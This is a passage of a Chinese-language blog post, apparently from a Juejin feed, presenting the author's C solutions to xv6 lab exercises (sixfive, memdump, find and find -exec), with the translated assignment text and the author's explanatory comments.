    <span class="hljs-type">char</span> c;
    <span class="hljs-type">int</span> state = ST_READY;
    <span class="hljs-type">long</span> <span class="hljs-type">long</span> current_val = <span class="hljs-number">0</span>;
    <span class="hljs-type">char</span> *seps = <span class="hljs-string">" -\r\t\n./,"</span>;

    <span class="hljs-comment">// 逐字符读取，这是题目给出的 Hint</span>
    <span class="hljs-keyword">while</span> (read(fd, &amp;c, <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(seps, c)) {
            <span class="hljs-comment">// 遇到分隔符，如果之前正在读有效数字，则判断并打印</span>
            <span class="hljs-keyword">if</span> (state == ST_DIGITS) {
                <span class="hljs-keyword">if</span> (current_val % <span class="hljs-number">5</span> == <span class="hljs-number">0</span> || current_val % <span class="hljs-number">6</span> == <span class="hljs-number">0</span>) {
                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%lld\n"</span>, current_val);
                }
            }
            <span class="hljs-comment">// 遇到分隔符后，重置状态为 READY</span>
            state = ST_READY;
            current_val = <span class="hljs-number">0</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">'0'</span> &amp;&amp; c &lt;= <span class="hljs-string">'9'</span>) {
            <span class="hljs-comment">// 遇到数字</span>
            <span class="hljs-keyword">if</span> (state == ST_READY || state == ST_DIGITS) {
                state = ST_DIGITS;
                current_val = current_val * <span class="hljs-number">10</span> + (c - <span class="hljs-string">'0'</span>);
            }
            <span class="hljs-comment">// 如果本来就是 INVALID 状态，则保持 INVALID</span>
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 遇到既非分隔符也非数字的字符（如 'v'）</span>
            state = ST_INVALID;
            current_val = <span class="hljs-number">0</span>;
        }
    }

    <span class="hljs-comment">// 隐式分隔符：处理文件末尾的情况</span>
    <span class="hljs-keyword">if</span> (state == ST_DIGITS) {
        <span class="hljs-keyword">if</span> (current_val % <span class="hljs-number">5</span> == <span class="hljs-number">0</span> || current_val % <span class="hljs-number">6</span> == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%lld\n"</span>, current_val);
        }
    }
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> {
    <span class="hljs-type">int</span> fd, i;

    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"usage: sixfive files...\n"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; argc; i++) {
        <span class="hljs-keyword">if</span> ((fd = open(argv[i], O_RDONLY)) &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"sixfive: cannot open %s\n"</span>, argv[i]);
            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
        }
        sixfive(fd);
        close(fd);
    }
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre>
<h3 data-id="heading-6">memdump (easy)</h3>
<p>这个练习将帮助你更多练习使用 C 指针。开始之前，请阅读《C 程序设计语言（第二版）》中 Kernighan 和 Ritchie（K&amp;R）所著的 5.1 节（指针和地址）到 5.6 节（指针数组）以及 6.4 节（指向结构的指针）。</p>
<p>看看 <code>user/memdump.c</code> 。你的任务是实现这个函数 <code>memdump(char *fmt, char *data)</code> 。 <code>memdump()</code> 的目的是按照 fmt 参数描述的格式打印 data 指向的内存内容。格式是一个 C 字符串。字符串的每个字符指示如何打印 data 的连续部分。因此，例如，一个具有多个字段的 C 结构体可以通过包含多个字符的格式字符串来打印。</p>
<p>你的 memdump()应该处理以下格式字符：</p>
<ul>
<li>i: 将接下来的 4 个字节的数据以十进制形式打印为 32 位整数。</li>
<li>p: 将接下来的 8 个字节的数据以十六进制形式打印为 64 位整数。</li>
<li>h: 将接下来的 2 个字节的数据以十进制形式打印为 16 位整数。</li>
<li>c: 将接下来的 1 个字节的数据以 8 位 ASCII 字符形式打印。</li>
<li>s: 接下来的 8 个字节包含一个指向 C 字符串的 64 位指针；打印该字符串。</li>
<li>S: 剩余的数据包含一个空终止的 C 字符串的字节；打印该字符串。</li>
</ul>
<p>你可以自由使用 C 的 <code>printf()</code> 中的 <code>memdump()</code> 。</p>
<p>如果 <code>memdump</code> 程序没有参数被执行，它会调用 <code>memdump()</code> 传递一些示例格式字符串和数据。如果 <code>memdump()</code> 正确实现，输出将会是：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">$</span> <span class="hljs-string">memdump</span>
<span class="hljs-attr">Example 1:</span>
<span class="hljs-number">61810</span>
<span class="hljs-number">2025</span>
<span class="hljs-attr">Example 2:</span>
<span class="hljs-string">a</span> <span class="hljs-string">string</span>
<span class="hljs-attr">Example 3:</span>
<span class="hljs-string">another</span>
<span class="hljs-attr">Example 4:</span>
<span class="hljs-string">BD0</span>
<span class="hljs-number">1819438967</span>
<span class="hljs-number">100</span>
<span class="hljs-string">z</span>
<span class="hljs-string">xyzzy</span>
<span class="hljs-attr">Example 5:</span>
<span class="hljs-string">hello</span>
<span class="hljs-string">w</span>
<span class="hljs-string">o</span>
<span class="hljs-string">r</span>
<span class="hljs-string">l</span>
<span class="hljs-string">d</span>
</code></pre>
<p>你可能会得到 Example 4 输出第一行的不同十六进制地址。</p>
<p>如果 <code>memdump</code> 程序带参数被调用，它会读取其标准输入直到文件结束，然后调用 <code>memdump()</code> ，并传递格式和输入数据。所以，一旦 <code>memdump()</code> 被实现：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$ </span><span class="bash"><span class="hljs-built_in">echo</span> deadc0de | memdump hhcccc</span>
25956
25697
c
0
d
e
<span class="hljs-meta prompt_">$ </span><span class="bash"><span class="hljs-built_in">echo</span> deadc0de | memdump p</span>
64616564
<span class="hljs-meta prompt_">$ </span><span class="bash">
</span></code></pre>
<p>实现 <code>memdump()</code> 。</p>
<h4 data-id="heading-7">My Solution:</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">memdump</span><span class="hljs-params">(<span class="hljs-type">char</span>* fmt, <span class="hljs-type">char</span>* data)</span> {
    <span class="hljs-comment">// Your code here.</span>
    <span class="hljs-type">char</span>* p = fmt;
    <span class="hljs-type">char</span>* curr = data;  <span class="hljs-comment">// 使用一个临时指针来遍历数据</span>

    <span class="hljs-keyword">while</span> (*p) {
        <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'i'</span>) {
            <span class="hljs-comment">// 打印 4 字节整数</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, *(<span class="hljs-type">int</span>*)curr);
            curr += <span class="hljs-number">4</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'p'</span>) {
            <span class="hljs-comment">// 打印 8 字节十六进制整数</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%lx\n"</span>, *(uint64*)curr);
            curr += <span class="hljs-number">8</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'h'</span>) {
            <span class="hljs-comment">// 打印 2 字节短整数</span>
            <span class="hljs-comment">// 注意：xv6 的 printf 可能需要 %d 来打印 short</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, *(<span class="hljs-type">short</span>*)curr);
            curr += <span class="hljs-number">2</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'c'</span>) {
            <span class="hljs-comment">// 打印 1 字节字符</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c\n"</span>, *curr);
            curr += <span class="hljs-number">1</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'s'</span>) {
            <span class="hljs-comment">// 数据里存的是一个指向字符串的 8 字节指针</span>
            <span class="hljs-type">char</span>* str_ptr = *(<span class="hljs-type">char</span>**)curr;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, str_ptr);
            curr += <span class="hljs-number">8</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">'S'</span>) {
            <span class="hljs-comment">// 数据里直接就是字符串的内容</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, curr);
            <span class="hljs-comment">// 'S' 标志通常意味着处理剩余的所有数据，或者直到遇到 \0</span>
            <span class="hljs-comment">// 根据题目描述 "the rest of the data"，打印后可以结束</span>
            <span class="hljs-keyword">return</span>;
        }
        p++;
    }
}
</code></pre>
<h3 data-id="heading-8">find (moderate)</h3>
<p>这个练习探讨了路径名和目录，以及系统调用 open、read 和 fstat。</p>
<p>为 xv6 编写一个简单的 UNIX find 程序：查找目录树中所有具有特定名称的文件。你的解决方案应保存在文件 <code>user/find.c</code> 中。</p>
<p>一些提示：</p>
<ul>
<li>查看 user/ls.c，了解如何读取目录。</li>
<li>使用递归使 find 能够深入子目录。</li>
<li>不要递归进入"."和".."。</li>
<li>每次你调用 make qemu ，它都会构建一个新的 fs.img，删除先前运行中创建的文件。如果你希望使用先前使用的文件系统启动 qemu，请使用 make qemu-fs 。</li>
<li>你需要使用 C 字符串。例如查看 K&amp;R（C 语言书籍）中的第 5.5 节。</li>
<li>注意，== 不像 Python 那样比较字符串。请使用 strcmp()。</li>
<li>将程序添加到 Makefile 中的 <code>UPROGS</code> 。</li>
</ul>
<p>你的解决方案应该产生以下输出（当文件系统包含文件 <code>b</code> 、 <code>a/b</code> 和 <code>a/aa/b</code> 时）：</p>
<pre><code class="hljs language-less" lang="less">    $ <span class="hljs-selector-tag">make</span> <span class="hljs-selector-tag">qemu</span>
    ...
    <span class="hljs-selector-tag">init</span>: <span class="hljs-selector-tag">starting</span> <span class="hljs-selector-tag">sh</span>
    $ <span class="hljs-selector-tag">echo</span> &gt; <span class="hljs-selector-tag">b</span>
    $ <span class="hljs-selector-tag">mkdir</span> <span class="hljs-selector-tag">a</span>
    $ <span class="hljs-selector-tag">echo</span> &gt; <span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">b</span>
    $ <span class="hljs-selector-tag">mkdir</span> <span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">aa</span>
    $ <span class="hljs-selector-tag">echo</span> &gt; <span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">aa</span>/<span class="hljs-selector-tag">b</span>
    $ <span class="hljs-selector-tag">find</span> . <span class="hljs-selector-tag">b</span>
    ./<span class="hljs-selector-tag">b</span>
    ./<span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">b</span>
    ./<span class="hljs-selector-tag">a</span>/<span class="hljs-selector-tag">aa</span>/<span class="hljs-selector-tag">b</span>
    $
  
</code></pre>
<p>运行 <code>make grade</code> 来看看我们的测试会怎么认为。</p>
<h4 data-id="heading-9">My Solution:</h4>
<p>需要注意<code>#include "kernel/types.h"</code>必须放在最前面，因为其他头文件中没有引入<code>"kernel/types.h"</code>，使用<code>uint</code>等类型会报错</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/types.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fcntl.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fs.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/stat.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"user/user.h"</span></span>

<span class="hljs-comment">// 获取路径中的文件名部分（指向 path 字符串中最后一个 '/' 之后的字符）</span>
<span class="hljs-comment">// 例如: "a/b/c" -&gt; "c", "file" -&gt; "file"</span>
<span class="hljs-type">char</span>* <span class="hljs-title function_">fmtname</span><span class="hljs-params">(<span class="hljs-type">char</span>* path)</span> {
    <span class="hljs-type">char</span>* p;
    <span class="hljs-comment">// 从字符串末尾开始向前查找第一个 '/'</span>
    <span class="hljs-keyword">for</span> (p = path + <span class="hljs-built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="hljs-string">'/'</span>; p--);
    p++;  <span class="hljs-comment">// 移动到 '/' 之后的字符，或者如果没找到 '/' 则指向 path 开头</span>
    <span class="hljs-keyword">return</span> p;
}

<span class="hljs-type">void</span> <span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">char</span>* path, <span class="hljs-type">char</span>* target)</span> {
    <span class="hljs-type">char</span> buf[<span class="hljs-number">512</span>], *p;
    <span class="hljs-type">int</span> fd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span>

    <span class="hljs-comment">// 打开路径</span>
    <span class="hljs-keyword">if</span> ((fd = open(path, O_RDONLY)) &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: cannot open %s\n"</span>, path);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 获取文件状态</span>
    <span class="hljs-keyword">if</span> (fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: cannot stat %s\n"</span>, path);
        close(fd);
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">switch</span> (st.type) {
        <span class="hljs-keyword">case</span> T_FILE:
            <span class="hljs-comment">// 如果是文件，检查文件名是否匹配</span>
            <span class="hljs-comment">// fmtname(path) 获取当前路径的文件名部分</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(fmtname(path), target) == <span class="hljs-number">0</span>) {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, path);
            }
            <span class="hljs-keyword">break</span>;

        <span class="hljs-keyword">case</span> T_DIR:
            <span class="hljs-comment">// 如果是目录，检查路径长度是否溢出缓冲区</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(path) + <span class="hljs-number">1</span> + DIRSIZ + <span class="hljs-number">1</span> &gt; <span class="hljs-keyword">sizeof</span> buf) {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"find: path too long\n"</span>);
                <span class="hljs-keyword">break</span>;
            }
            <span class="hljs-comment">// 构造当前目录的路径前缀，例如 "a/"</span>
            <span class="hljs-built_in">strcpy</span>(buf, path);
            p = buf + <span class="hljs-built_in">strlen</span>(buf);
            *p++ = <span class="hljs-string">'/'</span>;

            <span class="hljs-comment">// 循环读取目录项</span>
            <span class="hljs-keyword">while</span> (read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de)) {
                <span class="hljs-keyword">if</span> (de.inum == <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;

                <span class="hljs-comment">// 【关键】必须跳过 "." 和 ".."，否则会无限递归</span>
                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">"."</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">".."</span>) == <span class="hljs-number">0</span>)
                    <span class="hljs-keyword">continue</span>;

                <span class="hljs-comment">// 将目录项名称拼接到路径后，例如 "a/b"</span>
                memmove(p, de.name, DIRSIZ);
                p[DIRSIZ] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 确保字符串以 null 结尾</span>

                <span class="hljs-comment">// 递归调用 find</span>
                find(buf, target);
            }
            <span class="hljs-keyword">break</span>;
    }
    close(fd);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> {
    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) {
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"Usage: find &lt;path&gt; &lt;name&gt;\n"</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
    <span class="hljs-comment">// 调用 find 函数，传入路径和目标文件名</span>
    find(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>]);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre>
<h3 data-id="heading-10">exec (moderate)</h3>
<p>这个练习涉及系统调用 fork、exec 和 wait。</p>
<p>向 <code>find</code> 添加一个 "-exec <em>cmd</em>"，它将针对 <code>find</code> 找到的每个文件 <em>f</em> 执行程序 " <code>cmd file</code> "，而不是打印匹配的文件名。</p>
<p>以下示例说明 find -exec 行为： 注意这里的命令是"echo hi"和文件 是 "./wc"，使得命令为 "echo hi ./wc"， 它输出 "hi ./wc"。</p>
<p>一些提示：</p>
<ul>
<li>使用 <code>fork</code> 和 <code>exec</code> 在每个文件上调用命令。在父级使用 <code>wait</code> 等待孩子完成指令。</li>
<li>kernel/param.h 声明了 MAXARG，如果你需要声明一个 argv 数组，这可能很有用。</li>
</ul>
<p>要测试你的 find 解决方案，请运行 shell 脚本 findtest.sh。你的解决方案应该产生以下输出：</p>
<pre><code class="hljs language-ruby" lang="ruby">  <span class="hljs-variable">$ </span>make qemu
  ...
  <span class="hljs-symbol">init:</span> starting sh
  <span class="hljs-variable">$ </span>sh &lt; findtest.sh
<span class="hljs-variable">$ </span>echo <span class="hljs-variable constant_">DONE</span>
<span class="hljs-variable">$ </span><span class="hljs-variable">$ </span><span class="hljs-variable">$ </span><span class="hljs-variable">$ </span><span class="hljs-variable">$ </span>hello
hello
hello
<span class="hljs-variable">$ </span><span class="hljs-variable">$
</span>  
</code></pre>
<p>输出中有 很多 <code>$</code> ，因为 xv6 shell 感觉它正在处理来自文件的命令而不是来自控制台，并且为文件中的每个命令打印一个 <code>$</code> 。</p>
<h4 data-id="heading-11">My Solution:</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/types.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/stat.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"user/user.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fs.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/fcntl.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"kernel/param.h"</span>  <span class="hljs-comment">// 提供 MAXARG 定义</span></span>

<span class="hljs-comment">// 获取路径中的文件名部分</span>
<span class="hljs-type">char</span>*
<span class="hljs-title function_">fmtname</span><span class="hljs-params">(<span class="hljs-type">char</span> *path)</span>
{
  <span class="hljs-type">char</span> *p;
  <span class="hljs-keyword">for</span>(p=path+<span class="hljs-built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="hljs-string">'/'</span>; p--)
    ;
  p++;
  <span class="hljs-keyword">return</span> p;
}

<span class="hljs-comment">// 运行 exec 命令</span>
<span class="hljs-comment">// cmd_argv: 用户在命令行提供的命令参数 (例如 {"echo", "hi"})</span>
<span class="hljs-comment">// cmd_argc: 命令参数的个数</span>
<span class="hljs-comment">// file_path: 当前找到的文件路径 (例如 "./a/b")</span>
<span class="hljs-type">void</span>
<span class="hljs-title function_">run_exec</span><span class="hljs-params">(<span class="hljs-type">char</span> **cmd_argv, <span class="hljs-type">int</span> cmd_argc, <span class="hljs-type">char</span> *file_path)</span>
{
  <span class="hljs-type">char</span> *argv[MAXARG];
  <span class="hljs-type">int</span> i;

  <span class="hljs-comment">// 1. 检查参数数量是否溢出</span>
  <span class="hljs-comment">// 需要 cmd_argc 个原参数 + 1 个文件路径 + 1 个 NULL 结束符</span>
  <span class="hljs-keyword">if</span>(cmd_argc + <span class="hljs-number">2</span> &gt; MAXARG){
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: too many arguments for exec\n"</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 2. 构造新的 argv 数组</span>
  <span class="hljs-comment">// 复制原本的命令参数</span>
  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; cmd_argc; i++){
    argv[i] = cmd_argv[i];
  }
  <span class="hljs-comment">// 追加当前文件路径</span>
  argv[i] = file_path;
  <span class="hljs-comment">// 追加 NULL 结束符</span>
  argv[i+<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// 3. Fork 和 Exec</span>
  <span class="hljs-type">int</span> pid = fork();
  <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>){
    <span class="hljs-comment">// 子进程</span>
    exec(argv[<span class="hljs-number">0</span>], argv);
    <span class="hljs-comment">// 如果 exec 返回，说明出错了</span>
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: exec %s failed\n"</span>, argv[<span class="hljs-number">0</span>]);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>){
    <span class="hljs-comment">// 父进程等待子进程结束</span>
    wait(<span class="hljs-number">0</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: fork failed\n"</span>);
  }
}

<span class="hljs-comment">// 查找函数</span>
<span class="hljs-comment">// path: 当前搜索路径</span>
<span class="hljs-comment">// target: 目标文件名</span>
<span class="hljs-comment">// exec_argv: 如果非空，则指向 -exec 后的命令参数数组</span>
<span class="hljs-comment">// exec_argc: 命令参数个数</span>
<span class="hljs-type">void</span>
<span class="hljs-title function_">find</span><span class="hljs-params">(<span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *target, <span class="hljs-type">char</span> **exec_argv, <span class="hljs-type">int</span> exec_argc)</span>
{
  <span class="hljs-type">char</span> buf[<span class="hljs-number">512</span>], *p;
  <span class="hljs-type">int</span> fd;
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> <span class="hljs-title">de</span>;</span>
  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span>

  <span class="hljs-keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="hljs-number">0</span>){
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: cannot open %s\n"</span>, path);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="hljs-number">0</span>){
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: cannot stat %s\n"</span>, path);
    close(fd);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// 检查是否匹配</span>
  <span class="hljs-comment">// 逻辑：如果是文件，且名字匹配 target，则处理</span>
  <span class="hljs-comment">// 注意：标准 find 会在目录匹配时也执行，但根据题目输出示例，</span>
  <span class="hljs-comment">// 主要是针对找到的 target 执行。这里我们保持文件名的匹配逻辑。</span>
  <span class="hljs-keyword">if</span>(st.type == T_FILE &amp;&amp; <span class="hljs-built_in">strcmp</span>(fmtname(path), target) == <span class="hljs-number">0</span>){
    <span class="hljs-keyword">if</span>(exec_argv != <span class="hljs-number">0</span>){
      <span class="hljs-comment">// 如果有 -exec 选项，执行命令</span>
      run_exec(exec_argv, exec_argc, path);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 否则，打印路径</span>
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%s\n"</span>, path);
    }
  }

  <span class="hljs-comment">// 如果是目录，则递归</span>
  <span class="hljs-keyword">if</span>(st.type == T_DIR){
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(path) + <span class="hljs-number">1</span> + DIRSIZ + <span class="hljs-number">1</span> &gt; <span class="hljs-keyword">sizeof</span> buf){
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"find: path too long\n"</span>);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">strcpy</span>(buf, path);
      p = buf+<span class="hljs-built_in">strlen</span>(buf);
      *p++ = <span class="hljs-string">'/'</span>;
      
      <span class="hljs-keyword">while</span>(read(fd, &amp;de, <span class="hljs-keyword">sizeof</span>(de)) == <span class="hljs-keyword">sizeof</span>(de)){
        <span class="hljs-keyword">if</span>(de.inum == <span class="hljs-number">0</span>)
          <span class="hljs-keyword">continue</span>;
        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">"."</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(de.name, <span class="hljs-string">".."</span>) == <span class="hljs-number">0</span>)
          <span class="hljs-keyword">continue</span>;
        
        memmove(p, de.name, DIRSIZ);
        p[DIRSIZ] = <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// 递归调用，传递 exec 参数</span>
        find(buf, target, exec_argv, exec_argc);
      }
    }
  }
  close(fd);
}

<span class="hljs-type">int</span>
<span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>
{
  <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">3</span>){
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"Usage: find &lt;path&gt; &lt;name&gt; [-exec &lt;cmd&gt;...]\n"</span>);
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
  }

  <span class="hljs-type">char</span> *path = argv[<span class="hljs-number">1</span>];
  <span class="hljs-type">char</span> *target = argv[<span class="hljs-number">2</span>];
  <span class="hljs-type">char</span> **exec_argv = <span class="hljs-number">0</span>;
  <span class="hljs-type">int</span> exec_argc = <span class="hljs-number">0</span>;

  <span class="hljs-comment">// 检查是否有 -exec 参数</span>
  <span class="hljs-keyword">if</span>(argc &gt; <span class="hljs-number">3</span>){
    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">3</span>], <span class="hljs-string">"-exec"</span>) == <span class="hljs-number">0</span>){
      <span class="hljs-comment">// argv[4] 开始是命令，例如 {"echo", "hi"}</span>
      exec_argv = &amp;argv[<span class="hljs-number">4</span>];
      exec_argc = argc - <span class="hljs-number">4</span>; <span class="hljs-comment">// 计算命令参数个数</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"find: syntax error, expected -exec\n"</span>);
      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
    }
  }

  find(path, target, exec_argv, exec_argc);
  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你真的懂Thread.currentThread().interrupt()吗？]]></title>    <link>https://juejin.cn/post/7589962224795910182</link>    <guid>https://juejin.cn/post/7589962224795910182</guid>    <pubDate>2026-01-02T07:55:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795910182" data-draft-id="7587392473851707438" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你真的懂Thread.currentThread().interrupt()吗？"/> <meta itemprop="keywords" content="后端,架构,Java"/> <meta itemprop="datePublished" content="2026-01-02T07:55:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="想用offer打牌"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你真的懂Thread.currentThread().interrupt()吗？
